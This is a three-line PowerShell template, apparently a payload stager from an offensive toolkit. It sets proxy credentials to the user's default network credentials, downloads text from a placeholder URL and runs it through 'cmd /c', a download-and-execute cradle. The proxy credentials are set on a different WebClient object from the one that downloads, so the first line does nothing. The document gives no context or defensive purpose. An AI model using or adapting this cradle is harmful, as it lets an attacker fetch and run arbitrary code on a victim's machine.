(new-object net.webclient).proxy.credentials = [net.credentialcache]::defaultnetworkcredentials; 
$c = (new-object net.webclient).downloadstring('{{url}}'); 
cmd /c "$c";